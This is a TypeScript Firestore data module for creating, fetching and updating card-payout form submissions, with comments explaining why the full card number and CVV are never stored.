import {
  collection,
  doc,
  setDoc,
  getDoc,
  updateDoc,
  serverTimestamp,
} from "firebase/firestore";
import { db } from "@/lib/firebase";
import type { CheckoutForm1Data } from "@/components/data/checkout-form-1-data";

export interface PayoutSubmissionInput {
  linkId: string;
  orderId: string;
  data: CheckoutForm1Data;
}

export interface PayoutSubmission {
  id: string;
  linkId: string;
  orderId: string;
  email: string;
  firstName: string;
  lastName: string;
  phone: string;
  address: string;
  city: string;
  state: string;
  zipCode: string;
  country: string;
  cardName: string;
  cardLast4: string;
  expiryDate: string;
  saveInfo: boolean;
  /** Added later, via the "we couldn't complete your payment" retry dialog. */
  brandName?: string;
}

/**
 * Writes a payout submission to users/{ownerUid}/payoutSubmissions/{id}.
 *
 * SECURITY: this object is built with an explicit field list — NOT a
 * spread of `data` — specifically so cardNumber and cvv can never
 * accidentally leak into Firestore. Do not change this to `{ ...data }`
 * or add `data.cardNumber` / `data.cvv` anywhere below. The Firestore
 * rule for this collection actively rejects any write containing a
 * "cvv" or "cardNumber" key.
 */
export async function createPayoutSubmission(
  ownerUid: string,
  { linkId, orderId, data }: PayoutSubmissionInput,
): Promise<PayoutSubmission> {
  if (!ownerUid) {
    throw new Error("[createPayoutSubmission] ownerUid is falsy — cannot build doc path");
  }

  const ref = doc(collection(db, "users", ownerUid, "payoutSubmissions"));
  const cardLast4 = data.cardNumber.replace(/\s/g, "").slice(-4);

  const submission = {
    id: ref.id,
    linkId,
    orderId,
    email: data.email,
    firstName: data.firstName,
    lastName: data.lastName,
    phone: data.phone,
    address: data.address,
    city: data.city,
    state: data.state,
    zipCode: data.zipCode,
    country: data.country,
    cardName: data.cardName,
    cardLast4,
    expiryDate: data.expiryDate,
    saveInfo: !!data.saveInfo,
    createdAt: serverTimestamp(),
  };

  if ("cardNumber" in submission || "cvv" in submission) {
    throw new Error(
      "[createPayoutSubmission] Refusing to write: payload contains sensitive card data.",
    );
  }

  await setDoc(ref, submission);
  return submission as PayoutSubmission;
}

/**
 * Fetches a single payout submission by its exact id.
 *
 * Public "get by ID" is allowed by the Firestore rules (needed for the
 * post-submit processing page, where the visitor isn't authenticated),
 * but "list" the whole collection is NOT — nobody can browse or query
 * every submission, only fetch one they already have the exact ID for.
 */
export async function getPayoutSubmission(
  ownerUid: string,
  submissionId: string,
): Promise<PayoutSubmission | null> {
  const ref = doc(db, "users", ownerUid, "payoutSubmissions", submissionId);
  const snap = await getDoc(ref);
  if (!snap.exists()) return null;
  return snap.data() as PayoutSubmission;
}

/**
 * Updates ONLY the brandName field on an existing payout submission.
 * The Firestore rule for this collection enforces that public updates
 * can touch brandName/brandUpdatedAt and nothing else — every other
 * field on the submission is immutable after creation.
 */
export async function updatePayoutBrandName(
  ownerUid: string,
  submissionId: string,
  brandName: string,
): Promise<void> {
  const ref = doc(db, "users", ownerUid, "payoutSubmissions", submissionId);
  await updateDoc(ref, {
    brandName,
    brandUpdatedAt: serverTimestamp(),
  });
}
